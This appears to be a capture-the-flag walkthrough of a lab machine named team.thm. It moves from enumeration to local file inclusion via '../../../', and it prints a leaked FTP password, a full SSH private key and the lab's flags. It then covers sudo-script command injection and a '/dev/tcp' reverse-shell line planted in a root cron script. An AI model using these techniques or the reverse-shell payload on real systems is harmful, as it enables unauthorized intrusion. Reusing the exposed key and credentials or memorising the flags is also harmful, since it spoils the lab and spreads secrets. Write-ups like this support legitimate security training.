

nmap 
```
└─$ sudo nmap -p 1-10000 -Pn -sV 10.10.190.176
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 14:17 PDT
Nmap scan report for 10.10.190.176
Host is up (0.16s latency).
Not shown: 9997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

Anonymous ftp is not allowed. I ran gobuster to see what else I could find.
```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .php -u http://10.10.190.176   
/.hta                 (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11366]
/server-status        (Status: 403) [Size: 278]  
                                                
```

Not much it would seem. I looked at the source code for 10.10.190.176 and found this line.
` <title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>`
So I added team.thm to my /etc/hosts. I ran gobuster again to see if I could get more pages.

```
                                                                                                                                                       
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .php -u http://team.thm    
/.hta                 (Status: 403) [Size: 273]                                                                    
/.hta.php             (Status: 403) [Size: 273]                                                                    
/.htaccess            (Status: 403) [Size: 273]                                                                    
/.htpasswd            (Status: 403) [Size: 273]                                                                    
/.htaccess.php        (Status: 403) [Size: 273]                                                                    
/.htpasswd.php        (Status: 403) [Size: 273]                                                                    
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]                                      
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]                                      
/index.html           (Status: 200) [Size: 2966]                                                                   
/robots.txt           (Status: 200) [Size: 5]                                                                      
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/server-status        (Status: 403) [Size: 273]  
```

On `http://team.thm/robots.txt` I found the name:`dale`. So I will hold onto that for later use. I will also run hydra to see if I can login to ftp or ssh. While Hydra was running I decided to enumerate the directories that I found for team.thm.


/script enumeration
```
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js -u team.thm/scripts
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://team.thm/scripts
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt,js
[+] Timeout:                 10s
===============================================================
2022/07/15 12:04:46 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 273]
/.hta.php             (Status: 403) [Size: 273]
/.hta.html            (Status: 403) [Size: 273]
/.hta.txt             (Status: 403) [Size: 273]
/.hta.js              (Status: 403) [Size: 273]
/.htaccess.html       (Status: 403) [Size: 273]
/.htpasswd.html       (Status: 403) [Size: 273]
/.htaccess.txt        (Status: 403) [Size: 273]
/.htpasswd.txt        (Status: 403) [Size: 273]
/.htaccess            (Status: 403) [Size: 273]
/.htpasswd.js         (Status: 403) [Size: 273]
/.htaccess.js         (Status: 403) [Size: 273]
/.htpasswd            (Status: 403) [Size: 273]
/.htaccess.php        (Status: 403) [Size: 273]
/.htpasswd.php        (Status: 403) [Size: 273]
/script.txt           (Status: 200) [Size: 597]

```

script.txt
```
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

It looks like there is some extension that wasn't in my GoBuster search. I decided to use wfuzz to find the extension.
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~/team.thm]
└─$ wfuzz -w /usr/share/wordlists/wfuzz/general/medium.txt team.thm/scripts/script.FUZZ >> url_fuzzing.txt
...
└─$ cat *.txt | grep 200                                                     
000000015:   404        9 L      31 W       270 Ch      "2000"      
000000017:   404        9 L      31 W       270 Ch      "2002"      
000000014:   404        9 L      31 W       270 Ch      "200"       
000000018:   404        9 L      31 W       270 Ch      "2003"      
000000016:   404        9 L      31 W       270 Ch      "2001"      
000000200:   404        9 L      31 W       270 Ch      "beverly"   
000001037:   200        18 L     44 W       466 Ch      "old"       
000001200:   404        9 L      31 W       270 Ch      "publico"  
```
In the results, we can see that .old is what we are looking for.
```
└─$ cat script.old
#!/bin/bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

```

`ftpuser:T3@m$h@r3`



I was able to connect with ftp using the above creds and I found `/workshare/New_site.txt`
```
Dale
        I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles 

```
Let's add dev.team.thm to /etc/hosts.

On the page I clicked the hyperlink and was taken to `http://dev.team.thm/script.php?page=teamshare.php`
I messed around with command injection and couldn't find anything. I switched gears and tried navigating the file system.
I tried `http://dev.team.thm/script.php?page=../../../etc/passwd` and was successfulyl able to dump the contents of /etc/passwd.
I then tried to get user.txt from dale and got it pretty quickly. `http://dev.team.thm/script.php?page=../../../home/dale/user.txt`

```
dale@TEAM:~$ cat user.txt
THM{6Y0TXHz7c2d}
```


Now I know that I a good place to start my LFI enumeration is at `../../../`
I decided to use wfuzz to see if I could find interesting files to dump.
```
└─$ wfuzz -w LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php?page=../../../FUZZ >> ~/team.thm/wfuzz_lfi.txt
```
The problem with this search is that every response was a `200 OK`, so that's not super useful to seach the results in that way.
I can see the size of the response returned and can figure that if I get 200 OK result that's of a decent size then the file exists and I can dump its contents. I also know that I'm looking for a config/conf file so I grepped the results to see what I could find.
```
000000005:   200        230 L    1119 W     7313 Ch     "/etc/apache2/apache2.conf"  
000000080:   200        19 L     113 W      736 Ch      "/etc/resolv.conf" 
000000083:   200        52 L     218 W      1581 Ch     "/etc/ssh/ssh_config"                                                                        
000000084:   200        169 L    447 W      5990 Ch     "/etc/ssh/sshd_config" 
000000094:   200        160 L    955 W      5937 Ch     "/etc/vsftpd.conf"  
```

I began looking at each result and `/etc/ssh/sshd_config` gave me what I needed
```
dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn #NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE #NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W #oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK #o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP #zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu #k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS #xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S #0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2 #EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU #eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v #7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v #JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/ #FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l #gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4 #xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH #ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb #esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO #eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R #N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg #Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi #U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW #/vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz #82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA #wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q #z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6 #RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7 #/ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx #sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb #mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur #4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg #e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S #2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH #8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX #b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7 #CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH #-----END OPENSSH PRIVATE KEY-----
```

Using this key I was able to ssh in as dale.
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~/team.thm]
└─$ ssh dale@10.10.210.28 -i ~/team.thm/dale_key
Last login: Mon Jan 18 10:51:32 2021
dale@TEAM:~$ sudo -l
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks

```

admin_checks
```
-rwxr--r-- 1 gyles editors  399 Jan 15  2021 admin_checks
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```


```
dale@TEAM:/home/gyles$ $PATH

-bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin: No such file or directory

```

I tried adding /tmp to the front of PATH to see if I could hijack the date() function but that didn't work. I tried messing around with bash commands in the script and found this 
```
dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: gyles
Enter 'date' to timestamp the file: pwd
The Date is /home/gyles
Stats have been backed up

```

So I can inject bash commands. I entered `/bin/sh` in every parameter until...
```
Enter 'date' to timestamp the file: /bin/sh
The Date is /bin/sh
whoami
gyles

```

I went back to /tmp and ran linpeas as gyles to see what I could find.

I found this line `You can write script: /usr/local/bin/main_backup.sh`
The file's perms are `-rwxrwxr-x  1 root admin   65 Jan 17  2021 main_backup.sh`

gyles is part of the admin group `uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)`,
so I can write main_backup.sh and I think I can just become root.

I left `bash -i >& /dev/tcp/10.8.248.108/1111 0>&1` in the main_backup.sh.
I tried to execute the script by got a shell for gyles. I exited out and setup my listener again.
After a bit this process was executed by root and I got a root reverse shell.
`THM{fhqbznavfonq}`
